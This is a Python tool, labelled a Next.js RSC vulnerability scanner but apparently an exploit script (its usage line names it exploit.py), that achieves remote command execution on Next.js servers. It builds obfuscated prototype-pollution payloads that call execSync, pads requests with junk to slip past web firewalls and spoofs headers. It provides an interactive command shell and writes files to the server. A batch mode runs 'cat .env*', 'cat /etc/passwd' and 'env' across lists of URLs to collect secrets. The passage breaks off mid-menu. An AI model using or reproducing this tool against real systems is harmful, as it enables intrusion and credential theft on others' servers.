#!/usr/bin/env python3
"""
Next.js RSC Vulnerability Scanner
Converted from JavaScript to Python
"""

import requests
import urllib.parse
import re
import time
import sys
import secrets
import base64
import random
import string
import urllib3
from typing import Dict, List, Optional, Tuple

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import urlparse, urljoin
from datetime import datetime
from pathlib import Path


class NextJSRSCScanner:
    def __init__(self, target_url: str, proxy_url: Optional[str] = None):
        self.target_url = target_url
        self.proxy_url = proxy_url or "http://localhost:8765"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        })
        # Generate random boundary for this session
        self.boundary = f"----WebKitFormBoundary{secrets.token_hex(8)}"
        
    def detect_rsc_indicators(self, html_content: str) -> Dict:
        """Detect Next.js RSC indicators from HTML content"""
        indicators = {
            'detected': False,
            'indicator': None,
            'details': None
        }
        
        # Check for Next.js meta tags
        if 'name="next-head-count"' in html_content:
            indicators['detected'] = True
            indicators['indicator'] = 'Next.js detected'
            indicators['details'] = 'Found next-head-count meta tag'
            return indicators
        
        # Check for __NEXT_DATA__ scriptbu
        if 'id="__NEXT_DATA__"' in html_content:
            indicators['detected'] = True
            indicators['indicator'] = 'Next.js __NEXT_DATA__ found'
            indicators['details'] = 'Application uses Next.js data hydration'
            return indicators
        
        # Check for Next.js scripts
        if '/_next/' in html_content or 'next/dist' in html_content:
            indicators['detected'] = True
            indicators['indicator'] = 'Next.js scripts detected'
            indicators['details'] = 'Found Next.js framework files'
            return indicators
        
        return indicators
    
    def run_passive_detection(self) -> Dict:
        """Run passive detection on target URL"""
        print("[*] Running passive detection...")
        try:
            parsed_url = urlparse(self.target_url)
            target = f"{parsed_url.scheme}://{parsed_url.netloc}/"
            
            response = self.session.get(target, timeout=10)
            indicators = self.detect_rsc_indicators(response.text)
            
            if indicators['detected']:
                print(f"[+] {indicators['indicator']}: {indicators['details']}")
            else:
                print("[✓] No RSC indicators found")
                
            return indicators
        except Exception as e:
            print(f"[-] Error during passive detection: {e}")
            return {'detected': False, 'indicator': None, 'details': str(e)}
    
    def build_safe_payload(self) -> str:
        """Build safe fingerprint payload"""
        return f'--{self.boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n{{}}\r\n--{self.boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n["$1:aa:aa"]\r\n--{self.boundary}--'
    
    def build_rce_payload_with_code(self, js_code: str) -> str:
        """Build payload that executes JavaScript code directly (not shell command)"""
        # Base64 encode the JS code to bypass WAF
        b64_code = base64.b64encode(js_code.encode()).decode()
        
        # Obfuscated payload
        # var code = Buffer.from('...', 'base64').toString();
        # var res = (function(){ try { eval(code); return 'SUCCESS'; } catch(e) { return 'ERROR:'+e.message; } })();
        
        prefix = (
            f"var b=Buffer;var c=b['fr'+'om']('{b64_code}','ba'+'se64')['toS'+'tring']();"
            f"var res=(function(){{try{{eval(c);return 'SUCCESS'}}catch(e){{return 'ERROR:'+e.message}}}})();"
            f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
        
        part0 = '{' + f'"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\\\"then\\\":\\\"$B1337\\\"}}","_response":{{"_prefix":"{prefix}","_chunks":"$Q2","_formData":{{"get":"$1:constructor:constructor"}}}}' + '}'
        
        # Generate junk data (128KB) for WAF bypass
        param_name, junk = self.generate_junk_data(128 * 1024)
        junk_part = f'--{self.boundary}\\r\\nContent-Disposition: form-data; name="{param_name}"\\r\\n\\r\\n{junk}\\r\\n'
        
        return f'{junk_part}--{self.boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n{part0}\\r\\n--{self.boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n"$@0"\\r\\n--{self.boundary}\\r\\nContent-Disposition: form-data; name="2"\\r\\n\\r\\n[]\\r\\n--{self.boundary}--'
    
    def generate_junk_data(self, size_bytes: int) -> Tuple[str, str]:
        """Generate random junk data for WAF bypass."""
        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
        return param_name, junk

    def build_rce_payload(self, command: str) -> str:
        """Build RCE exploit payload"""
        # Base64 encode the command to bypass WAF filters on command strings
        b64_cmd = base64.b64encode(command.encode()).decode()
        
        # Heavily obfuscated payload to bypass WAF
        # Uses Base64 for command and split strings for keywords
        prefix = (
            f"var p=process;var r=p['main'+'Module']['re'+'quire'];"
            f"var c=r('ch'+'ild_pro'+'cess');var e=c['ex'+'ecSy'+'nc'];"
            f"var cmd=Buffer['fr'+'om']('{b64_cmd}','ba'+'se64')['toS'+'tring']();"
            f"var res=e(cmd)['toS'+'tring']()['tr'+'im']();"
            f";throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
        
        part0 = '{' + f'"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\\\"then\\\":\\\"$B1337\\\"}}","_response":{{"_prefix":"{prefix}","_chunks":"$Q2","_formData":{{"get":"$1:constructor:constructor"}}}}' + '}'
        
        # Generate junk data (128KB) for WAF bypass
        param_name, junk = self.generate_junk_data(128 * 1024)
        junk_part = f'--{self.boundary}\\r\\nContent-Disposition: form-data; name="{param_name}"\\r\\n\\r\\n{junk}\\r\\n'
        
        return f'{junk_part}--{self.boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n{part0}\\r\\n--{self.boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n"$@0"\\r\\n--{self.boundary}\\r\\nContent-Disposition: form-data; name="2"\\r\\n\\r\\n[]\\r\\n--{self.boundary}--'
    
    def is_vulnerable_safe_check(self, status: int, text: str, headers: Dict) -> bool:
        """Check if target is vulnerable (safe check)"""
        if status != 500 or 'E{"digest"' not in text:
            return False
        
        server = headers.get('server', '').lower()
        has_netlify_vary = 'netlify-vary' in headers
        
        return not (has_netlify_vary or server == 'netlify' or server == 'vercel')
    
    def is_vulnerable_rce_check(self, headers: Dict) -> bool:
        """Check if RCE exploit was successful"""
        redirect_header = headers.get('x-action-redirect', '')
        return bool(re.search(r'.*/login\?a=.*', redirect_header))
    
    def run_fingerprint_probe(self) -> Dict:
        """Run fingerprint probe to detect vulnerability"""
        print("[*] Running fingerprint probe...")
        try:
            parsed_url = urlparse(self.target_url)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
            
            # Try proxy first
            try:
                proxy_response = requests.post(
                    self.proxy_url,
                    headers={
                        'Content-Type': 'application/json',
                        'X-Target-URL': target_url,
                        'X-Action': 'fingerprint'
                    },
                    timeout=30
                )
                
                if proxy_response.ok:
                    data = proxy_response.json()
                    result = {
                        'status': data['status'],
                        'headers': data['headers'],
                        'body': data['body'],
                        'vulnerable': self.is_vulnerable_safe_check(
                            data['status'], data['body'], data['headers']
                        ),
                        'method': 'proxy'
                    }
                    self.display_fingerprint_result(result)
                    return result
            except Exception:
                print("[!] WARNING: CORS proxy not available at http://localhost:8765")
                print("[!] Start proxy: python3 main.py and select 1 OR python3 tools/cors_proxy.py")
                print("[*] Continuing with direct request...")
            
            # Direct request with CloudFront bypass headers
            parsed = urlparse(target_url)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                'Accept': 'text/x-component',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Next-Action': 'x',
                'Content-Type': f'multipart/form-data; boundary={self.boundary}',
                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                'Origin': origin,
                'Referer': target_url,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"macOS"',
                'X-Nextjs-Request-Id': secrets.token_hex(4),
                'X-Forwarded-For': '127.0.0.1',
            }
            
            response = self.session.post(
                target_url,
                headers=headers,
                data=self.build_safe_payload(),
                allow_redirects=False,
                timeout=30,
                verify=False
            )
            
            response_headers = dict(response.headers)
            
            result = {
                'status': response.status_code,
                'headers': response_headers,
                'body': response.text[:1000],
                'vulnerable': self.is_vulnerable_safe_check(
                    response.status_code, response.text, response_headers
                ),
                'method': 'direct'
            }
            
            self.display_fingerprint_result(result)
            return result
            
        except Exception as error:
            print(f"[-] Probe failed: {error}")
            return {
                'status': 0,
                'headers': {},
                'body': '',
                'vulnerable': False,
                'method': 'error',
                'error': str(error)
            }
    
    def run_exploit(self, command: str) -> Dict:
        """Run RCE exploit"""
        try:
            parsed_url = urlparse(self.target_url)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
            
            # Try proxy first
            try:
                proxy_response = requests.post(
                    self.proxy_url,
                    headers={
                        'Content-Type': 'application/json',
                        'X-Target-URL': target_url,
                        'X-Action': 'exploit',
                        'X-requrl': command
                    },
                    timeout=10
                )
                
                if proxy_response.ok:
                    data = proxy_response.json()
                    return {
                        'status': data['status'],
                        'headers': data['headers'],
                        'body': data['body'],
                        'vulnerable': self.is_vulnerable_rce_check(data['headers']),
                        'command': command,
                        'method': 'proxy'
                    }
            except Exception:
                print("[!] WARNING: CORS proxy not available at http://localhost:8765")
                print("[!] Start proxy: python3 tools/cors_proxy.py")
                print("[*] Continuing with direct request...")
            
            # Direct request with CloudFront bypass headers
            parsed = urlparse(target_url)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                'Accept': 'text/x-component',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Next-Action': 'x',
                'Content-Type': f'multipart/form-data; boundary={self.boundary}',
                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                'Origin': origin,
                'Referer': target_url,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"macOS"',
                'X-Nextjs-Request-Id': secrets.token_hex(4),
                'X-Forwarded-For': '127.0.0.1',
            }
            
            response = self.session.post(
                target_url,
                headers=headers,
                data=self.build_rce_payload(command),
                allow_redirects=False,
                timeout=30,
                verify=False
            )
            
            response_headers = dict(response.headers)
            
            return {
                'status': response.status_code,
                'headers': response_headers,
                'body': response.text[:1000],
                'vulnerable': self.is_vulnerable_rce_check(response_headers),
                'command': command,
                'method': 'direct'
            }
            
        except Exception as error:
            raise Exception(f"Exploit failed: {error}")
    
    def suggest_alternative_command(self, command: str) -> Optional[str]:
        """Suggest alternative commands that might work better"""
        # If command has quotes, try without quotes or with single quotes
        if '"' in command:
            if 'echo' in command and '>' in command:
                # Extract the content and file
                # echo "html" > public/a.html -> echo html > public/a.html
                alt = command.replace('"', '')
                return alt
        
        # If command has pipe and complex syntax, try simpler version
        if '|' in command:
            # Try without pipe
            parts = command.split('|')
            return parts[0].strip()
        
        return None
    
    def write_file_alternative(self, filepath: str, content: str, show_debug: bool = False) -> Dict:
        """Write file content using methods that avoid > character"""
        print("[*] Trying multiple methods to write file content...")
        
        # Try different methods to write content
        import base64
        b64_content = base64.b64encode(content.encode()).decode()
        
        methods = [
            # Method 1: dd command (no > needed)
            (f"echo '{content}' | dd of={filepath} 2>/dev/null", "dd command"),
            # Method 2: base64 decode with dd
            (f"echo {b64_content} | base64 -d | dd of={filepath} 2>/dev/null", "base64 + dd"),
            # Method 3: sed to write
            (f"sed -i '' '1s/^.*$/{content}/' {filepath}", "sed inline edit"),
            # Method 4: awk
            (f"awk 'BEGIN{{print \"{content}\"}}'  | dd of={filepath} 2>/dev/null", "awk + dd"),
        ]
        
        for i, (command, method_name) in enumerate(methods, 1):
            print(f"\n[*] Method {i}: {method_name}")
            if show_debug:
                print(f"[DEBUG] Command: {command}")
            
            try:
                result = self.run_exploit(command)
                
                if show_debug:
                    print(f"[DEBUG] Response status: {result['status']}")
                    redirect = result['headers'].get('x-action-redirect') or result['headers'].get('X-Action-Redirect')
                    if redirect:
                        print(f"[DEBUG] Redirect header: {redirect}")
                
                # If we get 303 (not 500), it might have worked
                if result['status'] == 303:
                    redirect_header = result['headers'].get('x-action-redirect') or result['headers'].get('X-Action-Redirect')
                    output = None
                    if redirect_header:
                        match = re.search(r'[?&]a=([^;&]+)', redirect_header)
                        if match:
                            output = urllib.parse.unquote(match.group(1))
                    
                    print(f"[+] Method {i} executed (status 303)!")
                    
                    # Verify by reading the file
                    print("[*] Verifying file content...")
                    verify_result = self.run_exploit(f"cat {filepath}")
                    if verify_result['status'] == 303:
                        verify_redirect = verify_result['headers'].get('x-action-redirect') or verify_result['headers'].get('X-Action-Redirect')
                        if verify_redirect:
                            verify_match = re.search(r'[?&]a=([^;&]+)', verify_redirect)
                            if verify_match:
                                file_content = urllib.parse.unquote(verify_match.group(1))
                                print(f"[+] File content: {file_content}")
                                
                                return {
                                    'status': result['status'],
                                    'headers': result['headers'],
                                    'output': file_content,
                                    'success': content in file_content or file_content in content,
                                    'method': method_name
                                }
                    
                    return {
                        'status': result['status'],
                        'headers': result['headers'],
                        'output': output,
                        'success': True,
                        'method': method_name
                    }
                else:
                    print(f"[-] Method {i} failed (status {result['status']})")
            except Exception as e:
                print(f"[-] Method {i} error: {e}")
        
        # If all methods failed
        return {
            'status': 500,
            'headers': {},
            'output': None,
            'success': False,
            'method': 'all failed'
        }
    
    def write_file_direct(self, filepath: str, content: str, show_debug: bool = False) -> Dict:
        """Write file using direct JavaScript fs.writeFileSync (no shell)"""
        print("[*] Writing file using JavaScript fs module directly...")
        
        # Escape content for JavaScript string
        escaped_content = (content
            .replace('\\', '\\\\')
            .replace("'", "\\'")
            .replace('\n', '\\n')
            .replace('\r', '\\r')
            .replace('\t', '\\t'))
        
        # JavaScript code to write file
        js_code = f"require('fs').writeFileSync('{filepath}', '{escaped_content}');"
        
        if show_debug:
            print(f"[DEBUG] JavaScript code: {js_code}")
        
        # Build payload with JS execution
        try:
            parsed_url = urlparse(self.target_url)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
            
            parsed = urlparse(target_url)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                'Accept': 'text/x-component',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Next-Action': 'x',
                'Content-Type': f'multipart/form-data; boundary={self.boundary}',
                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                'Origin': origin,
                'Referer': target_url,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"macOS"',
                'X-Nextjs-Request-Id': secrets.token_hex(4),
                'X-Forwarded-For': '127.0.0.1',
            }
            
            response = self.session.post(
                target_url,
                headers=headers,
                data=self.build_rce_payload_with_code(js_code),
                allow_redirects=False,
                timeout=30,
                verify=False
            )
            
            response_headers = dict(response.headers)
            
            if show_debug:
                print(f"[DEBUG] Response status: {response.status_code}")
                print(f"[DEBUG] Headers: {response_headers}")
            
            # Extract result
            redirect_header = response_headers.get('x-action-redirect') or response_headers.get('X-Action-Redirect')
            output = None
            if redirect_header:
                match = re.search(r'[?&]a=([^;&]+)', redirect_header)
                if match:
                    output = urllib.parse.unquote(match.group(1))
                    if show_debug:
                        print(f"[DEBUG] Output: {output}")
            
            return {
                'status': response.status_code,
                'headers': response_headers,
                'output': output,
                'success': output == 'SUCCESS'
            }
            
        except Exception as error:
            raise Exception(f"Write file failed: {error}")
    
    def execute_command_simple(self, command: str, show_debug: bool = False) -> Dict:
        """Execute a command and return result with exit code check"""
        print("[*] Executing command...")
        
        # For commands with redirection, wrap them to get feedback
        if '>' in command and not '>>' in command:
            # Wrap file creation commands to get output
            wrapped_cmd = f"{command} && echo 'SUCCESS' || echo 'FAILED'"
            if show_debug:
                print(f"[DEBUG] Wrapped command: {wrapped_cmd}")
        else:
            wrapped_cmd = command
        
        # Execute the command
        result = self.run_exploit(wrapped_cmd)
        
        if show_debug:
            print(f"\n[DEBUG] Response status: {result['status']}")
            print(f"[DEBUG] Headers: {result['headers']}")
            redirect = result['headers'].get('x-action-redirect') or result['headers'].get('X-Action-Redirect')
            if redirect:
                print(f"[DEBUG] Redirect header: {redirect}")
            print(f"[DEBUG] Body preview: {result['body'][:500]}")
        
        # Extract output from redirect header
        redirect_header = result['headers'].get('x-action-redirect') or result['headers'].get('X-Action-Redirect')
        output = None
        if redirect_header:
            # Parse format: /login?a=output;push or /login?a=output;307;
            match = re.search(r'[?&]a=([^;&]+)', redirect_header)
            if match:
                output = urllib.parse.unquote(match.group(1))
                if show_debug:
                    print(f"[DEBUG] Extracted output: {output}")
        
        return {
            'result': result,
            'command': command,
            'wrapped_command': wrapped_cmd,
            'output': output,
            'success': output is not None
        }
    
    def fetch_all_lines(self, command: str, max_lines: int = 100) -> Dict:
        """Fetch all lines of command output"""
        print("[*] Executing command...")
        
        try:
            # First, try to get output directly
            result = self.run_exploit(command)
            
            print(f"[DEBUG] Status: {result['status']}")
            redirect_header = result['headers'].get('x-action-redirect') or \
                            result['headers'].get('X-Action-Redirect')
            
            if redirect_header:
                print(f"[DEBUG] Redirect header found: {redirect_header[:200]}")
                match = re.search(r'\?a=([^;&]+)', redirect_header)
                if match:
                    output = urllib.parse.unquote(match.group(1))
                    if output and output.strip():
                        # Split into lines
                        lines = output.split('\n')
                        print(f"[+] Got {len(lines)} lines directly")
                        
                        return {
                            'command': command,
                            'lines': lines,
                            'totalLines': len(lines)
                        }
            else:
                print("[DEBUG] No redirect header, trying line-by-line method...")
            
            # If direct method didn't work, try line-by-line
            lines = []
            line_num = 1
            
            while line_num <= max_lines:
                line_cmd = f"{command} | tail -n +{line_num} | head -n 1"
                
                # Calculate progress based on lines retrieved so far, assuming we don't know total lines
                # Just show the count of lines retrieved
                print(f"[*] Retrieving output... {len(lines)} lines found", end='\r')
                
                # Retry logic for the current line
                line_success = False
                for attempt in range(3):
                    try:
                        result = self.run_exploit(line_cmd)
                        
                        redirect_header = result['headers'].get('x-action-redirect') or \
                                        result['headers'].get('X-Action-Redirect')
                        
                        if redirect_header:
                            match = re.search(r'\?a=([^;&]+)', redirect_header)
                            if match:
                                output = urllib.parse.unquote(match.group(1))
                                
                                # Check for End of Output (empty string usually means EOF with tail/head)
                                if output == "":
                                    line_success = False # Will break outer loop
                                    break
                                
                                # Valid line found
                                if output.strip():
                                    lines.append(output.strip())
                                
                                line_success = True
                                break
                        
                        # If request failed or no header, wait and retry
                        time.sleep(0.5)
                    except Exception:
                        time.sleep(0.5)
                
                if not line_success:
                    break
                
                line_num += 1
                time.sleep(0.1)
            
            print()  # New line after progress
            return {
                'command': command,
                'lines': lines,
                'totalLines': len(lines)
            }
            
        except Exception as e:
            print(f"\n[-] Error: {e}")
            return {
                'command': command,
                'lines': [],
                'totalLines': 0
            }
    
    def display_fingerprint_result(self, result: Dict) -> None:
        """Display fingerprint probe results"""
        print(f"\n[*] Status: {result['status']}")
        
        has_digest = result['body'] and 'E{"digest"' in result['body']
        is_500 = result['status'] == 500
        
        if result['vulnerable']:
            print("[!] ⚠️  VULNERABLE")
            print("[!] Server returned vulnerable response pattern")
            print("[!] ✓ RSC vulnerability detected")
            print("[!] ✓ Try RCE exploit")
        elif is_500 and has_digest:
            print("[!] ⚠️  POTENTIALLY VULNERABLE")
            print("[!] Server shows RSC error pattern")
        else:
            print("[✓] Not Vulnerable")
            print("[✓] No vulnerability detected")
        
        if has_digest:
            print("[*] Response contains RSC error digest")
        
        if result.get('method'):
            print(f"[*] Method: {result['method']}")
    
    def display_exploit_result(self, result: Dict) -> None:
        """Display exploit results"""
        print(f"\n[*] Status: {result['status']}")
        
        redirect_header = result['headers'].get('x-action-redirect') or \
                         result['headers'].get('X-Action-Redirect')
        has_redirect = bool(redirect_header)
        is_500 = result['status'] == 500
        has_digest = result['body'] and 'E{"digest"' in result['body']
        
        if result['vulnerable'] or has_redirect:
            print("[!] ⚠️  RCE CONFIRMED")
            
            if redirect_header:
                print(f"[*] Redirect: {redirect_header[:100]}...")
                
                match = re.search(r'\?a=([^;&]+)', redirect_header)
                if match:
                    output = urllib.parse.unquote(match.group(1))
                    print(f"\n[*] Command output:")
                    print("="*60)
                    print(f"$ {result['command']}")
                    print(output)
                    print("="*60)
        elif is_500 and has_digest:
            print("[!] ⚠️  POTENTIALLY VULNERABLE")
            print("[*] Server returned 500 with RSC error digest")
            print("[*] May be vulnerable but RCE not confirmed")
        else:
            print("[✓] Not Vulnerable")
            print("[✓] Target does not appear to be vulnerable")
        
        if result.get('method'):
            print(f"[*] Method: {result['method']}")
    
    def display_fetch_all_result(self, result: Dict) -> None:
        """Display the result of fetch_all_lines"""
        if result['totalLines'] > 0:
            print("\n" + "="*60)
            print("⚠️  RCE CONFIRMED")
            print("="*60)
            print(f"Command: {result['command']}")
            print(f"Lines: {result['totalLines']}")
            print("-"*60)
            print(f"$ {result['command']}")
            print("\n".join(result['lines']))
            print("="*60)
        else:
            print("\n[!] ⚠️  No Output")
            print("[!] Command returned no output or failed to execute")


def print_banner():
    """Print tool banner"""
    banner = """
╔══════════════════════════════════════════════════════════╗
║         Next.js RSC Vulnerability Scanner               ║
║              Python Version                              ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)


def print_menu():
    """Print interactive menu"""
    print("\n" + "="*60)
    print("MENU:")
    print("1. Run Passive Detection")
    print("2. Run Fingerprint Probe")
    print("3. Execute Single Command (with output)")
    print("4. Execute Command (Fetch All Lines - Loop Mode)")
    print("5. Quick Commands")
    print("6. Write file (helper)")
    print("7. Debug payload test")
    print("0. Exit")
    print("="*60)


def quick_commands_menu():
    """Show quick commands menu"""
    commands = {
        '1': 'whoami',
        '2': 'id',
        '3': 'pwd',
        '4': 'ls -la',
        '5': 'cat /etc/passwd',
        '6': 'uname -a',
        '7': 'env',
        '8': 'ps aux'
    }
    
    print("\n" + "="*60)
    print("QUICK COMMANDS:")
    for key, cmd in commands.items():
        print(f"{key}. {cmd}")
    print("0. Back")
    print("="*60)
    
    choice = input("Select command: ").strip()
    return commands.get(choice, '')


def batch_scan_urls(urls_file: str):
    """Scan multiple URLs from a text file"""
    try:
        with open(urls_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not urls:
            print("[-] No URLs found in file")
            return
        
        print(f"[*] Found {len(urls)} URLs to scan\n")
        
        # Commands to run on each target
        commands = ['pwd', 'ls -la', 'id', 'cat .env*']
        
        results = []
        
        for idx, url in enumerate(urls, 1):
            print("\n" + "="*70)
            print(f"[{idx}/{len(urls)}] Scanning: {url}")
            print("="*70)
            
            try:
                scanner = NextJSRSCScanner(url)
                
                target_results = {
                    'url': url,
                    'commands': {}
                }
                
                for cmd in commands:
                    print(f"\n[*] Executing: {cmd}")
                    try:
                        result = scanner.fetch_all_lines(cmd, max_lines=50)
                        
                        if result['lines']:
                            print(f"[+] Output ({len(result['lines'])} lines):")
                            for line in result['lines'][:20]:  # Show first 20 lines
                                print(f"    {line}")
                            if len(result['lines']) > 20:
                                print(f"    ... ({len(result['lines']) - 20} more lines)")
                            
                            target_results['commands'][cmd] = {
                                'success': True,
                                'lines': result['lines'],
                                'totalLines': result['totalLines']
                            }
                        else:
                            print("[!] No output")
                            target_results['commands'][cmd] = {
                                'success': False,
                                'lines': [],
                                'totalLines': 0
                            }
                        
                        time.sleep(0.5)  # Small delay between commands
                        
                    except Exception as e:
                        print(f"[-] Error executing {cmd}: {e}")
                        target_results['commands'][cmd] = {
                            'success': False,
                            'error': str(e)
                        }
                
                results.append(target_results)
                
            except Exception as e:
                print(f"[-] Error scanning {url}: {e}")
                results.append({
                    'url': url,
                    'error': str(e)
                })
            
            time.sleep(1)  # Delay between targets
        
        # Save results to file
        results_dir = Path(__file__).parent.parent / 'results'
        results_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = results_dir / f'scan_results_{timestamp}.txt'
        print(f"\n\n[*] Saving results to {output_file}...")
        
        with open(output_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write("BATCH SCAN RESULTS\n")
            f.write("="*70 + "\n\n")
            
            for result in results:
                f.write(f"\nURL: {result['url']}\n")
                f.write("-"*70 + "\n")
                
                if 'error' in result:
                    f.write(f"ERROR: {result['error']}\n")
                else:
                    for cmd, cmd_result in result['commands'].items():
                        f.write(f"\n[Command: {cmd}]\n")
                        if cmd_result.get('success'):
                            f.write(f"Lines: {cmd_result['totalLines']}\n")
                            for line in cmd_result['lines']:
                                f.write(f"{line}\n")
                        else:
                            f.write(f"FAILED: {cmd_result.get('error', 'No output')}\n")
                        f.write("\n")
                
                f.write("\n" + "="*70 + "\n")
        
        print(f"[+] Results saved to {output_file}")
        
    except FileNotFoundError:
        print(f"[-] File not found: {urls_file}")
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()


def main():
    """Main function"""
    print_banner()
    
    # If no arguments provided, prompt for input
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url_or_file>")
        print("Example: python3 exploit.py https://example.com")
        print("Example: python3 exploit.py urls.txt")
        print()
        target = input("Enter target URL or file path: ").strip()
        if not target:
            print("[-] No target provided")
            sys.exit(1)
    else:
        target = sys.argv[1]
    
    # Check if it's a file
    if target.endswith('.txt') and not target.startswith('http'):
        batch_scan_urls(target)
        return
    
    target_url = target
    print(f"[*] Target: {target_url}\n")
    
    scanner = NextJSRSCScanner(target_url)
    
    while True:
        print_menu()
        choice = input("Select option: ").strip()
        
        if choice == '0':
            print("[*] Exiting...")
            break
        elif choice == '1':
            scanner.run_passive_detection()
        elif choice == '2':
            try:
                scanner.run_fingerprint_probe()
            except Exception as e:
                print(f"[-] Error: {e}")
        elif choice == '3':
            command = input("Enter command to execute: ").strip()
            if command:
                try:
                    print(f"[*] Executing: {command}")
                    result = scanner.run_exploit(command)
                    scanner.display_exploit_result(result)
                except Exception as e:
                    print(f"[-] Error: {e}")
                    import traceback
                    traceback.print_exc()
        elif choice == '4':
            # Loop mode for option 4
            while True:
                print("\n" + "="*60)
                print("EXECUTE COMMAND MODE (Fetch All Lines)")
                print("="*60)
                command = input("Enter command (or 'back' to return): ").strip()
                
                if command.lower() == 'back':
                    break
                    
                if command:
                    try:
                        print(f"[*] Executing: {command}")
                        result = scanner.fetch_all_lines(command)
                        scanner.display_fetch_all_result(result)
                    except Exception as e:
                        print(f"[-] Error: {e}")
                        import traceback
                        traceback.print_exc()
        elif choice == '5':
            command = quick_commands_menu()
            if command:
                print(f"[*] Selected command: {command}")
                try:
                    result = scanner.fetch_all_lines(command)
                    scanner.display_fetch_all_result(result)
                except Exception as e:
                    print(f"[-] Error: {e}")
        elif choice == '6':
            filepath = input("Enter file path (e.g., public/a.html): ").strip()
            content = input("Enter content to write: ").strip()
            
            if filepath and content:
                print("\n[*] Using alternative method (touch + tee - no > character)...")
                try:
                    result = scanner.write_file_alternative(filepath, content, show_debug=True)
                    
                    if result['success']:
                        print(f"\n[+] ✅ File written successfully!")
                        print(f"[+] Content written: {result['output']}")
                        
                        # Verify
                        print("\n[*] Verifying file...")
                        verify = scanner.execute_command_simple(f"ls -la {filepath}", show_debug=False)
                        if verify['success']:
                            print(f"[+] File exists: {verify['output']}")
                        
                        # Read content
                        read = scanner.execute_command_simple(f"cat {filepath}", show_debug=False)
                        if read['success']:
                            print(f"[+] File content verified: {read['output']}")
                    else:
                        print(f"\n[-] ❌ Failed to write file")
                        if result['output']:
                            print(f"[-] Output: {result['output']}")
                        print("\n[*] This might be due to WAF/security blocking certain operations.")
                except Exception as e:
                    print(f"[-] Error: {e}")
                    import traceback
                    traceback.print_exc()
        elif choice == '7':
            print("\n[*] Testing different payload complexities...")
            
            
            # Test 1: Simple whoami (we know this works)
            print("\n[TEST 1] Simple command: whoami")
            try:
                result = scanner.execute_command_simple('whoami', show_debug=True)
                if result['success']:
